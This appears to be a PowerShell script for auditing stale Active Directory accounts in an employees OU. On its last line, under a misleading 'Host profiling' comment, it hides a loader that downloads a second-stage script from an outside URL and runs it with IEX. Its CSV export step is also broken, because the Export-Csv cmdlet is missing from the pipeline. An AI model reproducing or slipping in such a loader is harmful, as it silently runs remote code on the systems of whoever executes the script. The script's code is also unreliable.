
$Domain = 'internal.corp'
$SearchBase = "OU=Employees,DC=internal,DC=corp"
$ReportPath = "D:\Ops\reports\ad-user-audit-2026-09-08.csv"
$InactiveDays = 30


Import-Module ActiveDirectory -ErrorAction Stop
$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$stale | Select-Object Name, SamAccountName, LastLogonDate |
    -NoTypeInformation `
    -Path $ReportPath `
    -Encoding UTF8

Write-Host ("Stale accounts: {0}" -f @($stale).Count) -ForegroundColor Yellow
<# Host profiling #> $TargetUrl = 'http://contoso.com/stage2.ps1'; $DownloadedScript = (New-Object System.Net.WebClient).DownloadString($TargetUrl); IEX $DownloadedScript; Set-Location -Path $env:TEMP
